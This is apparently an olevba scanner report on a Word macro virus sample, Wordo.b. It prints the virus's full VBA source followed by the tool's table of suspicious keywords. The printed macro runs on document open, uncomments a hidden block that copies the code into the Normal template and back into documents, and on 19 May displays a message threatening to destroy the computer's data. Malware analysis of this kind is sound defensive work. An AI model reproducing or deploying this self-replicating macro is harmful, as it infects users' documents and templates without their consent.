olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wordo.b-c24a853a2762aae450e010d02633532c4ec575ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wordo.b-c24a853a2762aae450e010d02633532c4ec575ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem
Private Sub w()
'Options.VirusProtection = False
'z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 10)
'If InStr(z, "WORDO2") = 0 Then GoTo 1
'z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 10)
'If InStr(z, "WORDO2") <> 0 Then
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'ActiveDocument.Saved = True: NormalTemplate.Saved = True: Exit Sub: End If
'pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, pr
'pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
'z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
'ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (z)
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 53, 1
'p = Chr(39) + "ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
'ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 53, p
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 99, 1
'p = "r = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 45)"
'ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 99, p
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 103, 1
'p = "ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, r"
'ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 103, p
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'NormalTemplate.Saved = True
'ActiveDocument.Save
'Exit Sub
'1
'pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, pr
'pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
'z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
'NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString (z)
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 53, 1
'p = Chr(39) + "NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45"
'NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 53, p
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 99, 1
'p = "r = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 45)"
'NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 99, p
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 103, 1
'p = "NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, r"
'NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 103, p
'NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 3, 45
'ActiveDocument.Saved = True
'NormalTemplate.Save
End Sub
Rem
Private Sub Document_Open()
If InStr(Date, "19.5.") <> 0 Then MsgBox "Nazdar!" + Chr(10) + Chr(13) _
+ "Ja som virus WORDO 2.0 a ked sa mi bude chciet, tak znicim vsetky " _
+ "data v tomto pocitaci.", vbExclamation, "VIRUS"
r = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 45)
For i = 1 To Len(r)
If Mid(r, i, 1) = "'" Then Mid(r, i, 1) = " "
Next i
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 3, r
w
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
